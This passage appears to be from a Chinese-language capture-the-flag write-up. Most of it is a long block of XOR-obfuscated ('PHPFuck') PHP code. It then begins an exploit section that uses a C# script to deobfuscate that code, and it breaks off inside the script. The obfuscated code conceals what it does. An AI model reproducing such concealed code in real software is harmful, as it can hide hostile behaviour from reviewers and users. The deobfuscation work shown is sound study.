0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))):((\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;))((\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))))):((\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;))((\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))):((\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;))((\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))))):((\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;))((\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))); :::\nRecon # 這一題很複雜也需要很多的步驟\nExploit # 先利用別人的腳本把PHP fuck轉換回原本的code :::spoiler Script\nusing System; using System.IO; using System.Text.RegularExpressions; class Proj { // Fixes obfuscation pattern of the form (\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;) public static string RemoveParanthesisPattern(string data) { string pattern = @\u0026#34;\\((\u0026#39;.\u0026#39;\\^)+\u0026#39;.\u0026#39;\\)\u0026#34;; // 